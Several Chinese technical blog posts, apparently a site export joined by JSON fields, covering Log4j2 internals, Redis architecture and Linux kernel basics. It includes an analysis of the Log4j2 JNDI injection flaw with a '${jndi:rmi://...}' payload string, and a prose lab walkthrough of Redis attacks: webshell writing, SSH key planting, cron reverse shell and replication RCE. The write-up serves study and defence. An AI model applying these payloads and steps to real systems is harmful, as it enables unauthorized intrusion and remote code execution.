Log4j2分为2个jar包，一个是接口log4j-api-${版本号}.jar，一个是具体实现log4j-core-${版本号}.jar。Log4j只有一个jar包log4j-${版本号}.jar。Log4j2的版本号目前均为2.x。Log4j的版本号均为1.x。Log4j2的package名称前缀为org.apache.logging.log4j。Log4j的package名称前缀为org.apache.log4j。 log4j2架构架构图如下 LogManager 通过 getLogger(final Class&lt;?&gt; clazz) 静态方法将定位到合适的 LoggerContext，然后从中得到一个 Logger 对象，要创建 Logger 需要关联一个 LoggerConfig，该 LoggerConfig 对象在 Configuration 中关联着传送 LogEvents 的 Appenders。 Logger HierarchyLog4j 1.x 中的 Logger 层级由各 Loggers 之间的关系来维护，而 Log4j 2 中的 Logger 层级由 LoggerConfig 对象负责维护。Logger 和 LoggerConfig 都是命名的实体。Logger 的名称是大小写敏感的，遵循以下层级命名规则： 如果 LoggerConfig A 的名称后跟一个点号作为后代 LoggerConfig A..B 的名称前缀（表示任意中间前缀），那么 LoggerConfig A 是 LoggerConfig A.*.B 的 ancestor（An ancestor is a parent or the parent of an antecedent）；如果名称 A 和 B 之间没有其他内容，那么 LoggerConfig A 是 LoggerConfig A.B 的 parent。 类似的， java 包是 java.util 包的 parent，是 java.util.Vector 类的 ancestor。这种命名模式对大多数开发者来说都是熟悉的。下表显示了这种层级关系。 LoggerConfig ROOT com com.foo com.foo.Bar Root X Child descendant descendant com Parent X Child descendant com.foo Ancestor Parent X Child com.foo.Bar Ancestor Ancestor Parent X root LoggerConfig 位于 LoggerConfig 层级的最顶级，它存在于在每个层级中。直接链接到 root LoggerConfig 的 Logger 可以这样获得： 也可以更简单些： 其他 Logger 可以通过调用 LogManager.getLogger(final String name) 静态方法并传入期望的 Logger 名来获取。更多获取 Logger 的内容请参考 Log4j 2 API 。 LoggerContextLoggerContext 充当着日志系统的锚点。不同情况下一个应用可以有多个有效的 LoggerContext。 Configuration每个 LoggerContext 都有一个有效的 Configuration，该 Configuration 包含了所有的 Appenders、上下文范围的 Filters，以及 LoggerConfig， 并包含了 StrSubstitutor 的引用。在重新配置时会存在两个 Configuration。一旦所有的 Logger 重定向到新的 Configuration，旧的 Configuration 就会被停止和禁用。 LoggerLogger 本身执行无指向的动作，它仅含有一个与 LoggerConfig 关联的名称，继承了 AbstractLogger 并实现了其必需的方法，当配置被修改了，Loggers 可能转而关联不同的 LoggerConfig 从而会改变其自身的行为。如果调用 LogManager.getLogger 方法时使用相同的名称参数，则总会返回同一个 Logger 对象。例如： x 和y 参照的实际上是同一个 Logger 对象。通过将 Logger 命名为其所在类的全限定名可以使输出的日志更具可辨识性，这是目前最好的做法。这不是强制的，开发者可以为 Logger 起任意的期望名称。既然一般习惯使用所在类的全限定名命名 Logger，所以 LogManager.getLogger() 方法默认创建使用所在类全限定名命名的 Logger。 LoggerConfig当 Logger 在配置文件中声明时，就创建了 LoggerConfig 对象。LoggerConfig 包含一些 Filter，这些 Filter 用于过滤传递给任意 Appender 的 LogEvent。它还包含了一些 Appender 的引用，这些 Appender 用来处理事件。 Log LevelsLoggerConfig 会被分配一个日志级别。内建的日志级别按优先级从高到低排序有：OFF &gt; FATAL &gt; ERROR &gt; WARN &gt; INFO &gt; DEBUG &gt; TRACE &gt; ALL。Log4j 2 也支持自定义日志级别，另一种更细粒度化的机制是使用 Markers 来替代。 Log4j 1.x 和 Logback 都有一个日志级别继承的概念。Log4j 2 中，Logger 和 LoggerConfig 是两个不同的对象，所以这个概念也有所不同。每个 Logger 引用着一个合适的 LoggerConfig，该 LoggerConfig 又可以反过来继承该 Logger 的 parent LoggerConfig 的日志级别。 下面列出几张表演示了日志级别的继承逻辑。注意，如果 root LoggerConfig 没有配置，则它会被分配一个默认的日志级别（默认为 ERROR）。 在下面的示例中，只有 root Logger 通过与其名称匹配的 LoggerConfig 配置一个日志级别，所有其他 Logger 将引用 root LoggerConfig，并使用其日志级别。 Logger Name Assigned LoggerConfig LoggerConfig Level Logger Level root root DEBUG DEBUG X root DEBUG DEBUG X.Y root DEBUG DEBUG X.Y.Z root DEBUG DEBUG 在下面的示例中，所有 Logger 都配置了与各自名称匹配的 LoggerConfig 并从中获取日志级别。 Logger Name Assigned LoggerConfig LoggerConfig Level Level root root DEBUG DEBUG X X ERROR ERROR X.Y X.Y INFO INFO X.Y.Z X.Y.Z WARN WARN 在下面的示例中，名为 root、X 和 X.Y.Z 的 Logger 都配置了各自的 LoggerConfig，但名为 X.Y 的 Logger 并没有配置名称匹配的 LoggerConfig，它将使用名为 X 的 LoggerConfig 。因为 X LoggerConfig 的名称是 X.Y Logger 的名称开头的最长匹配，如果还有名为 W.X.Y 的 LoggerConfig，X.Y Logger 将会使用 W.X.Y LoggerConfig。 Logger Name Assigned LoggerConfig LoggerConfig Level Level root root DEBUG DEBUG X X ERROR ERROR X.Y X ERROR ERROR X.Y.Z X.Y.Z WARN WARN 在下面的示例中，root 和 X Logger 都配置了与各自名称匹配的 LoggerConfig，X.Y 和 X.Y.Z Logger 没有匹配 LoggerConfig，所以从分配给它们的 X LoggerConfig 中获取其日志级别。 Logger Name Assigned LoggerConfig LoggerConfig Level level root root DEBUG DEBUG X X ERROR ERROR X.Y X ERROR ERROR X.Y.Z X ERROR ERROR 在下面的示例中，root，X 和 X.Y Logger 都配置了与其各自名称匹配的 LoggerConfig，但 X.YZ Logger 没有配置 LoggerConfig，所以从分配给它的 X LoggerConfig 中获取其日志级别。由此可见，如果一个 Logger 没有配置 LoggerConfig，那么它将会继承使用上一级 LoggerConfig。 Logger Name Assigned LoggerConfig LoggerConfig Level level root root DEBUG DEBUG X X ERROR ERROR X.Y X.Y INFO INFO X.YZ X ERROR ERROR 在下面的示例中，X.Y Logger 配置了与其名称匹配的 X.Y LoggerConfig，但 X.Y LoggerConfig 没有配置日志级别，所以，X.Y LoggerConfig 从 X LoggerConfig 获取其日志级别。X.Y.Z Logger 没有配置与其名称匹配的 LoggerConfig，所以，X.Y.Z Logger 将使用 X.Y LoggerConfig，从而其级别也从 X LoggerConfig 获得。如果一个 Logger 的 LoggerConfig 没有配置日志级别，那么该 LoggerConfig 将会继承使用上一级 LoggerConfig 的日志级别 。 Logger Name Assigned LoggerConfig LoggerConfig Level Level root root DEBUG DEBUG X X ERROR ERROR X.Y X.Y ERROR X.Y.Z X.Y ERROR StrSubstitutor 和 StrLookupStrSubstitutor 类和 StrLookup 接口是从 Apache Commons Lang 借鉴修改而来用以处理 LogEvents 的。另外，Interpolator 类是从 Apache Commons Configuration 借鉴修改而来从而使 StrSubstitutor 可以处理多个 StrLookups 中的变量，该类也经过修改可以支持处理 LogEvents。这些类一起让配置可以引用 System Properties、配置文件、ThreadContext Map 以及 LogEvent 的 StructuredData 中的变量。 log4j,log4j2安全Log4j2的JNDI注入漏洞（CVE-2021-44228)Log4j2 LookupLog4j2的Lookup主要功能是通过引用一些变量，往日志中添加动态的值。这些变量可以是外部环境变量，也可以是MDC中的变量，还可以是日志上下文数据等 下面是一个简单的Java Lookup例子和输出： 10:21:19.618 [main] ERROR Log4j2RCEPoc – userId: test从上面的例子可以看到，通过在日志字符串中加入”${ctx:userId}”，Log4j2在输出日志时，会自动在Log4j2的ThreadContext中查找并引用userId变量。格式类似”${type:var}”，即可以实现对变量var的引用。type可以是如下值： ctx：允许程序将数据存储在 Log4j ThreadContext Map 中，然后在日志输出过程中，查找其中的值。env：允许系统在全局文件（如 &#x2F;etc&#x2F;profile）或应用程序的启动脚本中配置环境变量，然后在日志输出过程中，查找这些变量。例如：${env:USER}。java：允许查找Java环境配置信息。例如：${java:version}。jndi：允许通过 JNDI 检索变量。……其中和本次漏洞相关的便是jndi，例如：${jndi:rmi&#x2F;&#x2F;127.0.0.1:1099&#x2F;a}，表示通过JNDI Lookup功能，获取rmi&#x2F;&#x2F;127.0.0.1:1099&#x2F;a上的变量内容。 JNDIJNDI（Java Naming and Directory Interface，Java命名和目录接口），是Java提供的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 。 例如使用数据库，需要在各个应用中配置各种数据库相关的参数后使用。通过JNDI，可以将数据库相关的配置在一个支持JNDI服务的容器（通常Tomat等Web容器均支持）中统一完成，并暴露一个简洁的名称，该名称背后绑定着一个DataSource对象。各个应用只需要通过该名称和JNDI接口，获取该名称背后的DataSource对象。当然，现在SpringBoot单体发布模式，极少会使用这种方式了。 再举个更简单的例子，这有点类似DNS提供域名到IP地址的解析服务。域名简洁易懂，便于普通用户使用，背后真正对应的是一个复杂难记的IP，甚至还可能是多个IP。DNS即JNDI服务，域名即可用于绑定和查找的名称，IP即该名称绑定的真正对象。用现代可以类比的技术来说，JNDI就是一个对象注册中心。 JNDI由三部分组成：JNDI API、Naming Manager、JNDI SPI。JNDI API是应用程序调用的接口，JNDI SPI是具体实现，应用程序需要指定具体实现的SPI。 下面是一个简单的例子： 先运行HelloServer，再运行HelloClient，即可看到运行输出的结果：sayHello。 HelloServer将HelloImpl对象绑定到java:hello名称上。HelloClient使用java:hello名称，即可获取HelloImpl对象。 JNDI注入由前面的例子可以看到，JNDI服务管理着一堆的名称和这些名称上绑定着的对象。如果这些对象不是本地的对象，会如何处理？JNDI还支持从指定的远程服务器上下载class文件，加载到本地JVM中，并通过适当的方式创建对象。 “class文件加载到本地JVM中，并通过适当的方式创建对象”，在这个过程中，static代码块以及创建对象过程中的某些特定回调方法即有机会被执行。JNDI注入正是基于这个思路实现的。 本篇文章主要分析Log4j2的JNDI注入产生原因，并不会对JNDI注入自身太过关注，网上也有大量分析的文章可供参考，这里就不再详述了。   漏洞原理由于是JNDI注入，因此可以通过在InitialContext.lookup(String name)方法上设置端点，观察整个漏洞触发的调用堆栈，来了解原理。 整个调用堆栈较深，这里把几个关键点提取整理如下： LOGGER.error……MessagePatternConverter.format….StrSubstitutor.resolveVariableInterpolator.lookupJndiLookup.lookupJndiManager.lookupInitialContext.lookup MessagePatternConverter.format()poc代码中的LOGGER.error()方法最终会调用到MessagePatternConverter.format()方法，该方法对日志内容进行解析和格式化，并返回最终格式化后的日志内容。当碰到日志内容中包含${子串时，调用StrSubstitutor进行进一步解析。 StrSubstitutor.resolveVariable()StrSubstitutor将${和}之间的内容提取出来，调用并传递给Interpolator.lookup()方法，实现Lookup功能。 Interpolator.lookup()Interpolator实际是一个实现Lookup功能的代理类，该类在成员变量strLookupMap中保存着各类Lookup功能的真正实现类。Interpolator对 上一步提取出的内容解析后，从strLookupMap获得Lookup功能实现类，并调用实现类的lookup()方法。 例如对poc例子中的jndi:rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;exp解析后得到jndi的Lookup功能实现类为JndiLookup，并调用JndiLookup.lookup()方法。 JndiLookup.lookup()JndiLookup.lookup()方法调用JndiManager.lookup()方法，获取JNDI对象后，调用该对象上的toString()方法，最终返回该字符串。 JndiManager.lookup()JndiManager.lookup()较为简单，直接委托给InitialContext.lookup()方法。这里单独提到该方法，是因为后续几个补丁中较为重要的变更即为该方法。 Apache Log4j2 远程代码执行漏洞（CNVD-2021-95914） CVE-2019-17571、CVE-2020-9488、CVE-2021-4104、CVE-2021-44228、CVE-2021-44832、CVE-2021-45046、CVE-2021-45105、CVE-2022-23302、CVE-2022-23305 和 CVE-2022-23307"},{"title":"java安全-redis","date":"2024-02-10T13:45:55.000Z","url":"/2024/02/10/java%E5%AE%89%E5%85%A8-redis/","tags":[["java安全","/tags/java%E5%AE%89%E5%85%A8/"]],"categories":[["undefined",""]],"content":"java安全-redis1.什么是redisREmote DIctionary Server（Redis）是一个由 Salvatore Sanfilippo写的key-value存储系统。Redis是—个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于內存亦可持久化的日志型、Key-Value数据库，并提供多种语言的APl。它通常被称为数据结构服务器，因为值（value）可以是字符串（String），哈希（Map），列表（List），集合（sets）和有序集合（sorted sets）等类型 redis的数据结构如下： sql数据库和nosql数据库NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。SQL 数据库是关系型的，而 NoSQL 数据库是非关系型的。关系数据库管理系统 (RDBMS) 是结构化查询语言 (SQL) 的基础，可允许用户访问和操作高度结构化表中的数据。这是 MS SQL Server、IBM DB2、Oracle 和 MySQL 等数据库系统的基础模型。但是对于 NoSQL 数据库，数据访问语法可能因数据库而异。 key-valueredis遵守 BSD 协议，是一个高性能的 key-value 数据库。 Redis 与其他 key - value 缓存产品有以下三个特点： Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。 Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。 Redis支持数据的备份，即master-slave模式的数据备份 2.Redis 架构Redis 主要由有两个程序组成： Redis 客户端 redis-cli Redis 服务器 redis-server Redis 支持单机、主从、哨兵、集群多种架构模式 单机模式 单机模式顾名思义就是安装一个 Redis，启动起来，业务调用即可。例如一些简单的应用，并非必须保证高可用的情况下可以使用该模式。 ​ 单机 Redis 能够承载的 QPS（每秒查询速率）大概在几万左右。取决于业务操作的复杂性，Lua 脚本复杂性就极高。假如是简单的 key value 查询那性能就会很高。 假设上千万、上亿用户同时访问 Redis，QPS 达到 10 万+。这些请求过来，单机 Redis 直接就挂了。系统的瓶颈就出现在 Redis 单机问题上，此时我们可以通过主从复制解决该问题，实现系统的高并发。 主从模式​ Redis 的复制（Replication）功能允许用户根据一个 Redis 服务器来创建任意多个该服务器的复制品，其中被复制的服务器为主服务器（Master），而通过复制创建出来的复制品则为从服务器（Slave）。 只要主从服务器之间的网络连接正常，主服务器就会将写入自己的数据同步更新给从服务器，从而保证主从服务器的数据相同。 数据的复制是单向的，只能由主节点到从节点，简单理解就是从节点只支持读操作，不允许写操作。主要是读高并发的场景下用主从架构。主从模式需要考虑的问题是：当 Master 节点宕机，需要选举产生一个新的 Master 节点，从而保证服务的高可用性。 个人理解就是既然数据量太大，那我就加设备，由一台设备为主导，多台设备辅助。不过存在一个问题就是主节点出问题，读写就存在问题。并且选择主节点需要人工干预。 哨兵模式​ ​ 主从模式中，当主节点宕机之后，从节点是可以作为主节点顶上来继续提供服务，但是需要修改应用方的主节点地址，还需要命令所有从节点去复制新的主节点，整个过程需要人工干预。 于是，在 Redis 2.8 版本开始，引入了哨兵（Sentinel）这个概念，在主从复制的基础上，哨兵实现了自动化故障恢复。如上图所示，哨兵模式由两部分组成，哨兵节点和数据节点： 哨兵节点：哨兵节点是特殊的 Redis 节点，不存储数据； 数据节点：主节点和从节点都是数据节点。 Redis Sentinel 是分布式系统中监控 Redis 主从服务器，并提供主服务器下线时自动故障转移功能的模式。其中三个特性为： 监控(Monitoring)：Sentinel 会不断地检查你的主服务器和从服务器是否运作正常； 提醒(Notification)：当被监控的某个 Redis 服务器出现问题时， Sentinel 可以通过 API 向管理员或者其他应用程序发送通知； 自动故障迁移(Automatic failover)：当一个主服务器不能正常工作时， Sentinel 会开始一次自动故障迁移操作。 接下来我们了解一些 Sentinel 中的关键名词，然后系统讲解下哨兵模式的工作原理。 定时任务 Sentinel 内部有 3 个定时任务，分别是： 每 1 秒每个 Sentinel 对其他 Sentinel 和 Redis 节点执行 PING 操作（监控），这是一个心跳检测，是失败判定的依据。 每 2 秒每个 Sentinel 通过 Master 节点的 channel 交换信息（Publish&#x2F;Subscribe）； 每 10 秒每个 Sentinel 会对 Master 和 Slave 执行INFO命令，这个任务主要达到两个目的： 发现 Slave 节点； 确认主从关系。 主观下线 所谓主观下线（Subjectively Down， 简称 SDOWN）指的是单个 Sentinel 实例对服务器做出的下线判断，即单个 Sentinel 认为某个服务下线（有可能是接收不到订阅，之间的网络不通等等原因）。 主观下线就是说如果服务器在给定的毫秒数之内， 没有返回 Sentinel 发送的 PING 命令的回复， 或者返回一个错误， 那么 Sentinel 会将这个服务器标记为主观下线（SDOWN）。 客观下线 客观下线（Objectively Down， 简称 ODOWN）指的是多个 Sentinel 实例在对同一个服务器做出 SDOWN 判断，并且通过命令互相交流之后，得出的服务器下线判断，然后开启 failover。 只有在足够数量的 Sentinel 都将一个服务器标记为主观下线之后， 服务器才会被标记为客观下线（ODOWN）。只有当 Master 被认定为客观下线时，才会发生故障迁移。 仲裁 仲裁指的是配置文件中的 quorum 选项。某个 Sentinel 先将 Master 节点标记为主观下线，然后会将这个判定通过 sentinel is-master-down-by-addr 命令询问其他 Sentinel 节点是否也同样认为该 addr 的 Master 节点要做主观下线。最后当达成这一共识的 Sentinel 个数达到前面说的 quorum 设置的值时，该 Master 节点会被认定为客观下线并进行故障转移。 quorum 的值一般设置为 Sentinel 个数的二分之一加 1，例如 3 个 Sentinel 就设置为 2。 哨兵模式的工作原理 每个 Sentinel 以每秒一次的频率向它所知的 Master，Slave 以及其他 Sentinel 节点发送一个 PING 命令； 如果一个实例（instance）距离最后一次有效回复 PING 命令的时间超过配置文件 own-after-milliseconds 选项所指定的值，则这个实例会被 Sentinel 标记为主观下线； 如果一个 Master 被标记为主观下线，那么正在监视这个 Master 的所有 Sentinel 要以每秒一次的频率确认 Master 是否真的进入主观下线状态； 当有足够数量的 Sentinel（大于等于配置文件指定的值）在指定的时间范围内确认 Master 的确进入了主观下线状态，则 Master 会被标记为客观下线； 如果 Master 处于 ODOWN 状态，则投票自动选出新的主节点。将剩余的从节点指向新的主节点继续进行数据复制； 在正常情况下，每个 Sentinel 会以每 10 秒一次的频率向它已知的所有 Master，Slave 发送 INFO 命令；当 Master 被 Sentinel 标记为客观下线时，Sentinel 向已下线的 Master 的所有 Slave 发送 INFO 命令的频率会从 10 秒一次改为每秒一次； 若没有足够数量的 Sentinel 同意 Master 已经下线，Master 的客观下线状态就会被移除。若 Master 重新向 Sentinel 的 PING 命令返回有效回复，Master 的主观下线状态就会被移除。 集群模式​ 假设上千万、上亿用户同时访问 Redis，QPS 达到 10 万+。这些请求过来，单机 Redis 直接就挂了。系统的瓶颈就出现在 Redis 单机问题上，此时我们可以通过主从复制解决该问题，实现系统的高并发。 主从模式中，当主节点宕机之后，从节点是可以作为主节点顶上来继续提供服务，但是需要修改应用方的主节点地址，还需要命令所有从节点去复制新的主节点，整个过程需要人工干预。于是，在 Redis 2.8 版本开始，引入了哨兵（Sentinel）这个概念，在主从复制的基础上，哨兵实现了自动化故障恢复。 哨兵模式中，单个节点的写能力，存储能力受到单机的限制，动态扩容困难复杂。于是，Redis 3.0 版本正式推出 Redis Cluster 集群模式，有效地解决了 Redis 分布式方面的需求。Redis Cluster 集群模式具有高可用、可扩展性、分布式、容错等特性。 Redis簇采用无中心结构，每个节点都可以保存数据和整个集群状态，每个节点都和其他所有节点连接。Cluster 一般由多个节点组成，节点数量至少为 6 个才能保证组成完整高可用的集群，其中三个为主节点，三个为从节点。三个主节点会分配槽，处理客户端的命令请求，而从节点可用在主节点故障后，顶替主节点。 如上图所示，该集群中包含 6 个 Redis 节点，3 主 3 从，分别为 M1，M2，M3，S1，S2，S3。除了主从 Redis 节点之间进行数据复制外，所有 Redis 节点之间采用 Gossip 协议进行通信，交换维护节点元数据信息。 总结下来就是：读请求分配给 Slave 节点，写请求分配给 Master，数据同步从 Master 到 Slave 节点。 分片 单机、主从、哨兵的模式数据都是存储在一个节点上，其他节点进行数据的复制。而单个节点存储是存在上限的，集群模式就是把数据进行分片存储，当一个分片数据达到上限的时候，还可以分成多个分片。 Redis Cluster 采用虚拟哈希槽分区，所有的键根据哈希函数映射到 0 ~ 16383 整数槽内，计算公式：HASH_SLOT = CRC16(key) % 16384。每一个节点负责维护一部分槽以及槽所映射的键值数据。 ​ Redis 簇 提供了灵活的节点扩容和缩容方案。在不影响集群对外服务的情况下，可以为集群添加节点进行扩容也可以下线部分节点进行缩容。可以说，槽是 Redis Cluster 管理数据的基本单位，集群伸缩就是槽和数据在节点之间的移动。 简单的理解就是：扩容或缩容以后，槽需要重新分配，数据也需要重新迁移，但是服务不需要下线。 假如，这里有 3 个节点的集群环境如下： 节点 A 哈希槽范围为 0 ~ 5500； 节点 B 哈希槽范围为 5501 ~ 11000； 节点 C 哈希槽范围为 11001 ~ 16383。 此时，我们如果要存储数据，按照 Redis Cluster 哈希槽的算法，假设结果是： CRC16(key) % 16384 &#x3D; 6782。 那么就会把这个 key 的存储分配到 B 节点。此时连接 A、B、C 任何一个节点获取 key，都会这样计算，最终通过 B 节点获取数据。 假如这时我们新增一个节点 D，Redis Cluster 会从各个节点中拿取一部分 Slot 到 D 上，比如会变成这样： 节点 A 哈希槽范围为 1266 ~ 5500； 节点 B 哈希槽范围为 6827 ~ 11000； 节点 C 哈希槽范围为 12288 ~ 16383； 节点 D 哈希槽范围为 0 ~ 1265，5501 ~ 6826，11001 ~ 12287 这种特性允许在集群中轻松地添加和删除节点。同样的如果我想删除节点 D，只需要将节点 D 的哈希槽移动到其他节点，当节点是空时，便可完全将它从集群中移除。 ​ Redis 簇 为了保证数据的高可用性，加入了主从模式，一个主节点对应一个或多个从节点，主节点提供数据存取，从节点复制主节点数据备份，当这个主节点挂掉后，就会通过这个主节点的从节点选取一个来充当主节点，从而保证集群的高可用。 回到刚才的例子中，集群有 A、B、C 三个主节点，如果这 3 个节点都没有对应的从节点，如果 B 挂掉了，则集群将无法继续，因为我们不再有办法为 5501 ~ 11000 范围内的哈希槽提供服务。 所以我们在创建集群的时候，一定要为每个主节点都添加对应的从节点。比如，集群包含主节点 A、B、C，以及从节点 A1、B1、C1，那么即使 B 挂掉系统也可以继续正确工作。 因为 B1 节点属于 B 节点的子节点，所以 Redis 集群将会选择 B1 节点作为新的主节点，集群将会继续正确地提供服务。当 B 重新开启后，它就会变成 B1 的从节点。但是请注意，如果节点 B 和 B1 同时挂掉，Redis Cluster 就无法继续正确地提供服务了。 优点： 无中心架构；可扩展性，数据按照 Slot 存储分布在多个节点，节点间数据共享，节点可动态添加或删除，可动态调整数据分布；高可用性，部分节点不可用时，集群仍可用。通过增加 Slave 做备份数据副本。实现故障自动 failover，节点之间通过 gossip 协议交换状态信息，用投票机制完成 Slave 到 Master 的角色提升 缺点： 多主节点异步修改数据，数据一致性无法保证 redis安全Redis默认端口：6379 sentinel.conf配置器端口为26379。Reids被设计用于在信任的环境中访问的被授权客户端使用，这就导致了如果因为配置不当，则导致未授权访问漏洞。 配置不当一般主要是两个原理： 配置登录策略导致任意机器都可以登录 redis。 未设置密码或者设置弱口令。 Redis写入webshell Redis密钥登录SSH攻击机生成ssh-rsa密钥 然后在.ssh这个目录下 就生成了这两个文件 进行导出Key \\n\\n是为了防止乱码 把生成的key.txt 复制到redis&#x2F;src的目录下 进行写入 进行查看 是成功写入的 切换目录到靶机的/root/.ssh目录下 设置文件名 并进行导出 最后记得保存 进行登录 利用计划任务反弹shell写入一句话 或者这样也是可以的 利用主从复制RCE漏洞存在于4.X、5.X版本中，简单来讲就是 攻击者（主机）写一个so文件，然后通过 FULLRESYNC（全局）同步文件到受害人（从机）上。 下载两个脚本 远程登录 攻击机上执行 进行远程连接靶机 他这里问你 i：直接拿到shell 还是r：反弹shell 输入ip和port python进去pty 本地Redis主从复制RCE反弹shell但是 如果目标机器仅仅允许本地进行登录的时候 这个时候，我们可以通过配合其他漏洞，从目标本地登录 redis。然后手动执行脚本内写死的一些命令 将靶机 Redis作为从机，将攻击机器设置为主机 然后攻击机器会自动将一些恶意so文件同步给目标机器（从机），从而来实现对目标机器的远程命令执行。 还是用这两个脚本 但是要说一下 将 redis-rogue-server的exp.so文件复制到 Awsome文件夹中使用，因为exp.so带 system模块 开启监听 攻击机开启主服务器 然后去靶机上 查看模块 可以看到是没有的可用的模块 然后就可以看到攻击机这边开始了同步 关闭主从同步 执行反弹shell 就是没有回显 然后去攻击机那边进行查看 可以看到已经拿到了 python进入pty "},{"title":"Linux内核","date":"2023-10-10T23:44:48.000Z","url":"/2023/10/11/Linux%E5%86%85%E6%A0%B8/","categories":[["undefined",""]],"content":"Linux内核简介作用是将应用层序的请求传递给硬件，并充当底层驱动程序，对系统中的各种设备和组件进行寻址。目前支持模块的动态装卸(裁剪)。Linux内核就是基于这个策略实现的。Linux进程1.采用层次结构，每个进程都依赖于一个父进程。内核启动init程序作为第一个进程。该进程负责进一步的系统初始化操作。init进程是进程树的根，所有的进程都直接或者间接起源于该进程。virt&#x2F; —- 提供虚拟机技术的支持。 Linux内核预备工作 Linux内核的任务：1.从技术层面讲，内核是硬件与软件之间的一个中间层。作用是将应用层序的请求传递给硬件，并充当底层驱动程序，对系统中的各种设备和组件进行寻址。 2.从应用程序的层面讲，应用程序与硬件没有联系，只与内核有联系，内核是应用程序知道的层次中的最底层。在实际工作中内核抽象了相关细节。 3.内核是一个资源管理程序。负责将可用的共享资源(CPU时间、磁盘空间、网络连接等)分配得到各个系统进程。 4.内核就像一个库，提供了一组面向系统的命令。系统调用对于应用程序来说，就像调用普通函数一样。 内核实现策略：1.微内核。最基本的功能由中央内核（微内核）实现。所有其他的功能都委托给一些独立进程，这些进程通过明确定义的通信接口与中心内核通信。 2.宏内核。内核的所有代码，包括子系统（如内存管理、文件管理、设备驱动程序）都打包到一个文件中。内核中的每一个函数都可以访问到内核中所有其他部分。目前支持模块的动态装卸(裁剪)。Linux内核就是基于这个策略实现的。 哪些地方用到了内核机制？1.进程（在cpu的虚拟内存中分配地址空间，各个进程的地址空间完全独立;同时执行的进程数最多不超过cpu数目）之间进行通 信，需要使用特定的内核机制。 2.进程间切换(同时执行的进程数最多不超过cpu数目)，也需要用到内核机制。 进程切换也需要像FreeRTOS任务切换一样保存状态，并将进程置于闲置状态&#x2F;恢复状态。 3.进程的调度。确认哪个进程运行多长的时间。 Linux进程1.采用层次结构，每个进程都依赖于一个父进程。内核启动init程序作为第一个进程。该进程负责进一步的系统初始化操作。init进程是进程树的根，所有的进程都直接或者间接起源于该进程。 2.通过pstree命令查询。实际上得系统第一个进程是systemd，而不是init（这也是疑问点） 3.系统中每一个进程都有一个唯一标识符(ID),用户（或其他进程）可以使用ID来访问进程。 Linux内核源代码的目录结构Linux内核源代码包括三个主要部分： 内核核心代码，包括第3章所描述的各个子系统和子模块，以及其它的支撑子系统，例如电源管理、Linux初始化等 其它非核心代码，例如库文件（因为Linux内核是一个自包含的内核，即内核不依赖其它的任何软件，自己就可以编译通过）、固件集合、KVM（虚拟机技术）等 编译脚本、配置文件、帮助文档、版权说明等辅助性文件 使用ls命令看到的内核源代码的顶层目录结构，具体描述如下。 include&#x2F; —- 内核头文件，需要提供给外部模块（例如用户空间代码）使用。 kernel&#x2F; —- Linux内核的核心代码，包含了3.2小节所描述的进程调度子系统，以及和进程调度相关的模块。 mm&#x2F; —- 内存管理子系统（3.3小节）。 fs&#x2F; —- VFS子系统（3.4小节）。 net&#x2F; —- 不包括网络设备驱动的网络子系统（3.5小节）。 ipc&#x2F; —- IPC（进程间通信）子系统。 arch&#x2F;&#x2F; —- 体系结构相关的代码，例如arm, x86等等。 arch&#x2F;&#x2F;mach- —- 具体的machine&#x2F;board相关的代码。 arch&#x2F;&#x2F;include&#x2F;asm —- 体系结构相关的头文件。 arch&#x2F;&#x2F;boot&#x2F;dts —- 设备树（Device Tree）文件。 init&#x2F; —- Linux系统启动初始化相关的代码。 block&#x2F; —- 提供块设备的层次。 sound&#x2F; —- 音频相关的驱动及子系统，可以看作“音频子系统”。 drivers&#x2F; —- 设备驱动（在Linux kernel 3.10中，设备驱动占了49.4的代码量）。 lib&#x2F; —- 实现需要在内核中使用的库函数，例如CRC、FIFO、list、MD5等。 crypto&#x2F; —– 加密、解密相关的库函数。 security&#x2F; —- 提供安全特性（SELinux）。 virt&#x2F; —- 提供虚拟机技术（KVM等）的支持。 usr&#x2F; —- 用于生成initramfs的代码。 firmware&#x2F; —- 保存用于驱动第三方设备的固件。 samples&#x2F; —- 一些示例代码。 tools&#x2F; —- 一些常用工具，如性能剖析、自测试等。 Kconfig, Kbuild, Makefile, scripts&#x2F; —- 用于内核编译的配置文件、脚本等。 COPYING —- 版权声明。 MAINTAINERS —-维护者名单。 CREDITS —- Linux主要的贡献者名单。 REPORTING-BUGS —- Bug上报的指南。 Documentation, README —- 帮助、说明文档。 Linux内核体系结构简析简析 最上面是用户（或应用程序）空间。这是用户应用程序执行的地方。用户空间之下是内核空间，Linux 内核正是位于这里。GNU C Library （glibc）也在这里。它提供了连接内核的系统调用接口，还提供了在用户空间应用程序和内核之间进行转换的机制。这点非常重要，因为内核和用户空间的应用程序使用的是不同的保护地址空间。每个用户空间的进程都使用自己的虚拟地址空间，而内核则占用单独的地址空间。 Linux 内核可以进一步划分成 3 层。最上面是系统调用接口，它实现了一些基本的功能，例如 read 和 write。系统调用接口之下是内核代码，可以更精确地定义为独立于体系结构的内核代码。这些代码是 Linux 所支持的所有处理器体系结构所通用的。在这些代码之下是依赖于体系结构的代码，构成了通常称为 BSP（Board Support Package）的部分。这些代码用作给定体系结构的处理器和特定于平台的代码。 Linux 内核实现了很多重要的体系结构属性。在或高或低的层次上，内核被划分为多个子系统。Linux 也可以看作是一个整体，因为它会将所有这些基本服务都集成到内核中。这与微内核的体系结构不同，后者会提供一些基本的服务，例如通信、I&#x2F;O、内存和进程管理，更具体的服务都是插入到微内核层中的。每种内核都有自己的优点，不过这里并不对此进行讨论。 随着时间的流逝，Linux 内核在内存和 CPU 使用方面具有较高的效率，并且非常稳定。但是对于 Linux 来说，最为有趣的是在这种大小和复杂性的前提下，依然具有良好的可移植性。Linux 编译后可在大量处理器和具有不同体系结构约束和需求的平台上运行。一个例子是 Linux 可以在一个具有内存管理单元（MMU）的处理器上运行，也可以在那些不提供 MMU 的处理器上运行。 Linux 内核的 uClinux 移植提供了对非 MMU 的支持。 图2是Linux内核的体系结构 图2 Linux内核体系结构 Linux内核的主要组件有：系统调用接口、进程管理、内存管理、虚拟文件系统、网络堆栈、设备驱动程序、硬件架构的相关代码。 （1）系统调用接口SCI 